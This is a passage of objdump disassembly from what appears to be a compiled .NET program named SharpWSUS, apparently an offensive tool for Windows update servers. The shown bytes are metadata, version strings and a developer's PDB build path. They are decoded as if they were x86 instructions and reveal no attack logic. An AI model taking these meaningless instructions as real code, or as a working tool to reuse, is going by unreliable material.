  40d829:	01 0e                	add    %ecx,(%esi)
  40d82b:	08 07                	or     %al,(%edi)
  40d82d:	20 02                	and    %al,(%edx)
  40d82f:	01 13                	add    %edx,(%ebx)
  40d831:	00 13                	add    %dl,(%ebx)
  40d833:	01 0c 15 12 71 02 0e 	add    %ecx,0xe027112(,%edx,1)
  40d83a:	15 12 80 89 01       	adc    $0x1898012,%eax
  40d83f:	12 40 07             	adc    0x7(%eax),%al
  40d842:	15 12 80 89 01       	adc    $0x1898012,%eax
  40d847:	12 40 05             	adc    0x5(%eax),%al
  40d84a:	20 02                	and    %al,(%edx)
  40d84c:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40d84f:	07                   	pop    %es
  40d850:	07                   	pop    %es
  40d851:	04 02                	add    $0x2,%al
  40d853:	02 12                	add    (%edx),%dl
  40d855:	40                   	inc    %eax
  40d856:	02 04 00             	add    (%eax,%eax,1),%al
  40d859:	01 02                	add    %eax,(%edx)
  40d85b:	0e                   	push   %cs
  40d85c:	03 07                	add    (%edi),%eax
  40d85e:	01 0e                	add    %ecx,(%esi)
  40d860:	04 20                	add    $0x20,%al
  40d862:	01 01                	add    %eax,(%ecx)
  40d864:	09 0f                	or     %ecx,(%edi)
  40d866:	07                   	pop    %es
  40d867:	0b 08                	or     (%eax),%ecx
  40d869:	09 09                	or     %ecx,(%ecx)
  40d86b:	09 12                	or     %edx,(%edx)
  40d86d:	51                   	push   %ecx
  40d86e:	09 1d 05 02 0e 02    	or     %ebx,0x20e0205
  40d874:	02 05 00 00 12 81    	add    0x81120000,%al
  40d87a:	09 05 20 01 1d 05    	or     %eax,0x51d0120
  40d880:	0e                   	push   %cs
  40d881:	05 07 03 0e 02       	add    $0x20e0307,%eax
  40d886:	0e                   	push   %cs
  40d887:	02 06                	add    (%esi),%al
  40d889:	02 05 20 02 0e 0e    	add    0xe0e0220,%al
  40d88f:	0e                   	push   %cs
  40d890:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40d896:	34 e0                	xor    $0xe0,%al
  40d898:	89 08                	mov    %ecx,(%eax)
  40d89a:	b0 3f                	mov    $0x3f,%al
  40d89c:	5f                   	pop    %edi
  40d89d:	7f 11                	jg     0x40d8b0
  40d89f:	d5 0a                	aad    $0xa
  40d8a1:	3a 04 01             	cmp    (%ecx,%eax,1),%al
  40d8a4:	00 00                	add    %al,(%eax)
  40d8a6:	00 04 02             	add    %al,(%edx,%eax,1)
  40d8a9:	00 00                	add    %al,(%eax)
  40d8ab:	00 04 04             	add    %al,(%esp,%eax,1)
  40d8ae:	00 00                	add    %al,(%eax)
  40d8b0:	00 04 08             	add    %al,(%eax,%ecx,1)
  40d8b3:	00 00                	add    %al,(%eax)
  40d8b5:	00 04 10             	add    %al,(%eax,%edx,1)
  40d8b8:	00 00                	add    %al,(%eax)
  40d8ba:	00 04 20             	add    %al,(%eax,%eiz,1)
  40d8bd:	00 00                	add    %al,(%eax)
  40d8bf:	00 04 00             	add    %al,(%eax,%eax,1)
  40d8c2:	02 00                	add    (%eax),%al
  40d8c4:	00 04 00             	add    %al,(%eax,%eax,1)
  40d8c7:	01 00                	add    %eax,(%eax)
  40d8c9:	00 04 00             	add    %al,(%eax,%eax,1)
  40d8cc:	03 00                	add    (%eax),%eax
  40d8ce:	00 04 19             	add    %al,(%ecx,%ebx,1)
  40d8d1:	00 02                	add    %al,(%edx)
  40d8d3:	00 04 06             	add    %al,(%esi,%eax,1)
  40d8d6:	00 02                	add    %al,(%edx)
  40d8d8:	00 04 3f             	add    %al,(%edi,%edi,1)
  40d8db:	00 0f                	add    %cl,(%edi)
  40d8dd:	00 02                	add    %al,(%edx)
  40d8df:	06                   	push   %es
  40d8e0:	0a 03                	or     (%ebx),%al
  40d8e2:	06                   	push   %es
  40d8e3:	11 55 02             	adc    %edx,0x2(%ebp)
  40d8e6:	06                   	push   %es
  40d8e7:	08 07                	or     %al,(%edi)
  40d8e9:	06                   	push   %es
  40d8ea:	15 12 71 02 0e       	adc    $0xe027112,%eax
  40d8ef:	0e                   	push   %cs
  40d8f0:	0d 06 15 12 71       	or     $0x71121506,%eax
  40d8f5:	02 0e                	add    (%esi),%cl
  40d8f7:	15 12 80 89 01       	adc    $0x1898012,%eax
  40d8fc:	12 40 03             	adc    0x3(%eax),%al
  40d8ff:	06                   	push   %es
  40d900:	11 5c 02 06          	adc    %ebx,0x6(%edx,%eax,1)
  40d904:	19 03                	sbb    %eax,(%ebx)
  40d906:	06                   	push   %es
  40d907:	12 68 08             	adc    0x8(%eax),%ch
  40d90a:	06                   	push   %es
  40d90b:	15 12 80 89 01       	adc    $0x1898012,%eax
  40d910:	12 40 05             	adc    0x5(%eax),%al
  40d913:	00 01                	add    %al,(%ecx)
  40d915:	02 12                	add    (%edx),%dl
  40d917:	45                   	inc    %ebp
  40d918:	04 00                	add    $0x0,%al
  40d91a:	00 12                	add    %dl,(%edx)
  40d91c:	5d                   	pop    %ebp
  40d91d:	03 00                	add    (%eax),%eax
  40d91f:	00 02                	add    %al,(%edx)
  40d921:	07                   	pop    %es
  40d922:	20 04 01             	and    %al,(%ecx,%eax,1)
  40d925:	0e                   	push   %cs
  40d926:	0e                   	push   %cs
  40d927:	0e                   	push   %cs
  40d928:	02 04 20             	add    (%eax,%eiz,1),%al
  40d92b:	01 0e                	add    %ecx,(%esi)
  40d92d:	0e                   	push   %cs
  40d92e:	06                   	push   %es
  40d92f:	00 02                	add    %al,(%edx)
  40d931:	02 12                	add    (%edx),%dl
  40d933:	45                   	inc    %ebp
  40d934:	0e                   	push   %cs
  40d935:	06                   	push   %es
  40d936:	00 02                	add    %al,(%edx)
  40d938:	02 12                	add    (%edx),%dl
  40d93a:	45                   	inc    %ebp
  40d93b:	08 03                	or     %al,(%ebx)
  40d93d:	00 00                	add    %al,(%eax)
  40d93f:	01 07                	add    %eax,(%edi)
  40d941:	00 03                	add    %al,(%ebx)
  40d943:	02 12                	add    (%edx),%dl
  40d945:	45                   	inc    %ebp
  40d946:	0e                   	push   %cs
  40d947:	0e                   	push   %cs
  40d948:	0a 00                	or     (%eax),%al
  40d94a:	02 01                	add    (%ecx),%al
  40d94c:	0e                   	push   %cs
  40d94d:	15 12 71 02 0e       	adc    $0xe027112,%eax
  40d952:	0e                   	push   %cs
  40d953:	05 00 01 01 1d       	add    $0x1d010100,%eax
  40d958:	0e                   	push   %cs
  40d959:	09 20                	or     %esp,(%eax)
  40d95b:	01 01                	add    %eax,(%ecx)
  40d95d:	15 12 71 02 0e       	adc    $0xe027112,%eax
  40d962:	0e                   	push   %cs
  40d963:	09 00                	or     %eax,(%eax)
  40d965:	01 12                	add    %edx,(%edx)
  40d967:	50                   	push   %eax
  40d968:	15 12 75 01 0e       	adc    $0xe017512,%eax
  40d96d:	08 20                	or     %ah,(%eax)
  40d96f:	00 15 12 71 02 0e    	add    %dl,0xe027112
  40d975:	0e                   	push   %cs
  40d976:	0a 20                	or     (%eax),%ah
  40d978:	02 01                	add    (%ecx),%al
  40d97a:	02 15 12 71 02 0e    	add    0xe027112,%dl
  40d980:	0e                   	push   %cs
  40d981:	0a 00                	or     (%eax),%al
  40d983:	01 12                	add    %edx,(%edx)
  40d985:	50                   	push   %eax
  40d986:	15 12 71 02 0e       	adc    $0xe027112,%eax
  40d98b:	0e                   	push   %cs
  40d98c:	04 00                	add    $0x0,%al
  40d98e:	00 12                	add    %dl,(%edx)
  40d990:	50                   	push   %eax
  40d991:	0a 20                	or     (%eax),%ah
  40d993:	02 02                	add    (%edx),%al
  40d995:	0e                   	push   %cs
  40d996:	15 12 71 02 0e       	adc    $0xe027112,%eax
  40d99b:	0e                   	push   %cs
  40d99c:	09 00                	or     %eax,(%eax)
  40d99e:	05 09 19 0e 09       	add    $0x90e1909,%eax
  40d9a3:	08 10                	or     %dl,(%eax)
  40d9a5:	08 04 00             	or     %al,(%eax,%eax,1)
  40d9a8:	01 09                	add    %ecx,(%ecx)
  40d9aa:	08 0c 00             	or     %cl,(%eax,%eax,1)
  40d9ad:	06                   	push   %es
  40d9ae:	09 08                	or     %ecx,(%eax)
  40d9b0:	0e                   	push   %cs
  40d9b1:	08 10                	or     %dl,(%eax)
  40d9b3:	09 12                	or     %edx,(%edx)
  40d9b5:	51                   	push   %ecx
  40d9b6:	10 09                	adc    %cl,(%ecx)
  40d9b8:	06                   	push   %es
  40d9b9:	00 03                	add    %al,(%ebx)
  40d9bb:	0e                   	push   %cs
  40d9bc:	19 0e                	sbb    %ecx,(%esi)
  40d9be:	0e                   	push   %cs
  40d9bf:	08 00                	or     %al,(%eax)
  40d9c1:	04 0e                	add    $0xe,%al
  40d9c3:	19 0e                	sbb    %ecx,(%esi)
  40d9c5:	11 5c 0e 04          	adc    %ebx,0x4(%esi,%ecx,1)
  40d9c9:	20 00                	and    %al,(%eax)
  40d9cb:	12 40 03             	adc    0x3(%eax),%al
  40d9ce:	08 00                	or     %al,(%eax)
  40d9d0:	0e                   	push   %cs
  40d9d1:	03 28                	add    (%eax),%ebp
  40d9d3:	00 02                	add    %al,(%edx)
  40d9d5:	08 28                	or     %ch,(%eax)
  40d9d7:	00 15 12 71 02 0e    	add    %dl,0xe027112
  40d9dd:	0e                   	push   %cs
  40d9de:	08 01                	or     %al,(%ecx)
  40d9e0:	00 08                	add    %cl,(%eax)
  40d9e2:	00 00                	add    %al,(%eax)
  40d9e4:	00 00                	add    %al,(%eax)
  40d9e6:	00 1e                	add    %bl,(%esi)
  40d9e8:	01 00                	add    %eax,(%eax)
  40d9ea:	01 00                	add    %eax,(%eax)
  40d9ec:	54                   	push   %esp
  40d9ed:	02 16                	add    (%esi),%dl
  40d9ef:	57                   	push   %edi
  40d9f0:	72 61                	jb     0x40da53
  40d9f2:	70 4e                	jo     0x40da42
  40d9f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40d9f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40d9f6:	45                   	inc    %ebp
  40d9f7:	78 63                	js     0x40da5c
  40d9f9:	65 70 74             	gs jo  0x40da70
  40d9fc:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40da03:	77 73                	ja     0x40da78
  40da05:	01 08                	add    %ecx,(%eax)
  40da07:	01 00                	add    %eax,(%eax)
  40da09:	07                   	pop    %es
  40da0a:	01 00                	add    %eax,(%eax)
  40da0c:	00 00                	add    %al,(%eax)
  40da0e:	00 0e                	add    %cl,(%esi)
  40da10:	01 00                	add    %eax,(%eax)
  40da12:	09 53 68             	or     %edx,0x68(%ebx)
  40da15:	61                   	popa
  40da16:	72 70                	jb     0x40da88
  40da18:	57                   	push   %edi
  40da19:	53                   	push   %ebx
  40da1a:	55                   	push   %ebp
  40da1b:	53                   	push   %ebx
  40da1c:	00 00                	add    %al,(%eax)
  40da1e:	05 01 00 00 00       	add    $0x1,%eax
  40da23:	00 17                	add    %dl,(%edi)
  40da25:	01 00                	add    %eax,(%eax)
  40da27:	12 43 6f             	adc    0x6f(%ebx),%al
  40da2a:	70 79                	jo     0x40daa5
  40da2c:	72 69                	jb     0x40da97
  40da2e:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40da34:	20 20                	and    %ah,(%eax)
  40da36:	32 30                	xor    (%eax),%dh
  40da38:	32 31                	xor    (%ecx),%dh
  40da3a:	00 00                	add    %al,(%eax)
  40da3c:	29 01                	sub    %eax,(%ecx)
  40da3e:	00 24 34             	add    %ah,(%esp,%esi,1)
  40da41:	32 63 61             	xor    0x61(%ebx),%ah
  40da44:	62 62 37             	bound  %esp,0x37(%edx)
  40da47:	34 2d                	xor    $0x2d,%al
  40da49:	31 31                	xor    %esi,(%ecx)
  40da4b:	39 39                	cmp    %edi,(%ecx)
  40da4d:	2d 34 30 66 31       	sub    $0x31663034,%eax
  40da52:	2d 39 33 35 34       	sub    $0x34353339,%eax
  40da57:	2d 36 32 39 34       	sub    $0x34393236,%eax
  40da5c:	62 62 61             	bound  %esp,0x61(%edx)
  40da5f:	38 64 33 61          	cmp    %ah,0x61(%ebx,%esi,1)
  40da63:	34 00                	xor    $0x0,%al
  40da65:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40da68:	00 07                	add    %al,(%edi)
  40da6a:	31 2e                	xor    %ebp,(%esi)
  40da6c:	30 2e                	xor    %ch,(%esi)
  40da6e:	30 2e                	xor    %ch,(%esi)
  40da70:	30 00                	xor    %al,(%eax)
  40da72:	00 49 01             	add    %cl,0x1(%ecx)
  40da75:	00 1a                	add    %bl,(%edx)
  40da77:	2e 4e                	cs dec %esi
  40da79:	45                   	inc    %ebp
  40da7a:	54                   	push   %esp
  40da7b:	46                   	inc    %esi
  40da7c:	72 61                	jb     0x40dadf
  40da7e:	6d                   	insl   (%dx),%es:(%edi)
  40da7f:	65 77 6f             	gs ja  0x40daf1
  40da82:	72 6b                	jb     0x40daef
  40da84:	2c 56                	sub    $0x56,%al
  40da86:	65 72 73             	gs jb  0x40dafc
  40da89:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40da90:	38 01                	cmp    %al,(%ecx)
  40da92:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40da96:	46                   	inc    %esi
  40da97:	72 61                	jb     0x40dafa
  40da99:	6d                   	insl   (%dx),%es:(%edi)
  40da9a:	65 77 6f             	gs ja  0x40db0c
  40da9d:	72 6b                	jb     0x40db0a
  40da9f:	44                   	inc    %esp
  40daa0:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40daa7:	61                   	popa
  40daa8:	6d                   	insl   (%dx),%es:(%edi)
  40daa9:	65 12 2e             	adc    %gs:(%esi),%ch
  40daac:	4e                   	dec    %esi
  40daad:	45                   	inc    %ebp
  40daae:	54                   	push   %esp
  40daaf:	20 46 72             	and    %al,0x72(%esi)
  40dab2:	61                   	popa
  40dab3:	6d                   	insl   (%dx),%es:(%edi)
  40dab4:	65 77 6f             	gs ja  0x40db26
  40dab7:	72 6b                	jb     0x40db24
  40dab9:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40dabc:	38 08                	cmp    %cl,(%eax)
  40dabe:	01 00                	add    %eax,(%eax)
	...
  40dacc:	c8 fa b9 e7          	enter  $0xb9fa,$0xe7
  40dad0:	00 00                	add    %al,(%eax)
  40dad2:	00 00                	add    %al,(%eax)
  40dad4:	02 00                	add    (%eax),%al
  40dad6:	00 00                	add    %al,(%eax)
  40dad8:	7d 00                	jge    0x40dada
  40dada:	00 00                	add    %al,(%eax)
  40dadc:	00 db                	add    %bl,%bl
  40dade:	00 00                	add    %al,(%eax)
  40dae0:	00 bd 00 00 00 00    	add    %bh,0x0(%ebp)
	...
  40daee:	00 00                	add    %al,(%eax)
  40daf0:	10 00                	adc    %al,(%eax)
	...
  40dafe:	00 00                	add    %al,(%eax)
  40db00:	52                   	push   %edx
  40db01:	53                   	push   %ebx
  40db02:	44                   	inc    %esp
  40db03:	53                   	push   %ebx
  40db04:	5c                   	pop    %esp
  40db05:	d9 09                	(bad) (%ecx)
  40db07:	5b                   	pop    %ebx
  40db08:	15 ba d5 44 9f       	adc    $0x9f44d5ba,%eax
  40db0d:	b1 51                	mov    $0x51,%cl
  40db0f:	c2 95 38             	ret    $0x3895
  40db12:	22 cc                	and    %ah,%cl
  40db14:	01 00                	add    %eax,(%eax)
  40db16:	00 00                	add    %al,(%eax)
  40db18:	43                   	inc    %ebx
  40db19:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  40db1d:	65 72 73             	gs jb  0x40db93
  40db20:	5c                   	pop    %esp
  40db21:	73 2e                	jae    0x40db51
  40db23:	6b 73 65 6e          	imul   $0x6e,0x65(%ebx),%esi
  40db27:	6f                   	outsl  %ds:(%esi),(%dx)
  40db28:	66 6f                	outsw  %ds:(%esi),(%dx)
  40db2a:	6e                   	outsb  %ds:(%esi),(%dx)
  40db2b:	74 6f                	je     0x40db9c
  40db2d:	76 5c                	jbe    0x40db8b
  40db2f:	44                   	inc    %esp
  40db30:	6f                   	outsl  %ds:(%esi),(%dx)
  40db31:	63 75 6d             	arpl   %esi,0x6d(%ebp)
  40db34:	65 6e                	outsb  %gs:(%esi),(%dx)
  40db36:	74 73                	je     0x40dbab
  40db38:	5c                   	pop    %esp
  40db39:	73 68                	jae    0x40dba3
  40db3b:	61                   	popa
  40db3c:	72 65                	jb     0x40dba3
  40db3e:	64 5f                	fs pop %edi
  40db40:	66 6f                	outsw  %ds:(%esi),(%dx)
  40db42:	6c                   	insb   (%dx),%es:(%edi)
  40db43:	64 65 72 5c          	fs gs jb 0x40dba3
  40db47:	65 78 63             	gs js  0x40dbad
  40db4a:	65 70 74             	gs jo  0x40dbc1
  40db4d:	69 6f 6e 5c 53 68 61 	imul   $0x6168535c,0x6e(%edi),%ebp
  40db54:	72 70                	jb     0x40dbc6
  40db56:	57                   	push   %edi
  40db57:	53                   	push   %ebx
  40db58:	55                   	push   %ebp
  40db59:	53                   	push   %ebx
  40db5a:	5c                   	pop    %esp
  40db5b:	53                   	push   %ebx
  40db5c:	68 61 72 70 57       	push   $0x57707261
  40db61:	53                   	push   %ebx
  40db62:	55                   	push   %ebp
  40db63:	53                   	push   %ebx
  40db64:	5c                   	pop    %esp
  40db65:	6f                   	outsl  %ds:(%esi),(%dx)
  40db66:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  40db69:	44                   	inc    %esp
  40db6a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40db6e:	5c                   	pop    %esp
  40db6f:	53                   	push   %ebx
  40db70:	68 61 72 70 57       	push   $0x57707261
  40db75:	53                   	push   %ebx
  40db76:	55                   	push   %ebp
  40db77:	53                   	push   %ebx
  40db78:	2e 70 64             	jo,pn  0x40dbdf
  40db7b:	62 00                	bound  %eax,(%eax)
  40db7d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40db7e:	db 00                	fildl  (%eax)
	...
  40db88:	00 bf db 00 00 00    	add    %bh,0xdb(%edi)
  40db8e:	20 00                	and    %al,(%eax)
	...
  40dba4:	00 b1 db 00 00 00    	add    %dh,0xdb(%ecx)
	...
  40dbb2:	00 5f 43             	add    %bl,0x43(%edi)
  40dbb5:	6f                   	outsl  %ds:(%esi),(%dx)
  40dbb6:	72 45                	jb     0x40dbfd
  40dbb8:	78 65                	js     0x40dc1f
  40dbba:	4d                   	dec    %ebp
  40dbbb:	61                   	popa
  40dbbc:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40dbc3:	72 65                	jb     0x40dc2a
  40dbc5:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40dbc9:	6c                   	insb   (%dx),%es:(%edi)
	...
  40dbd2:	ff 25 00 20 40 00    	jmp    *0x402000
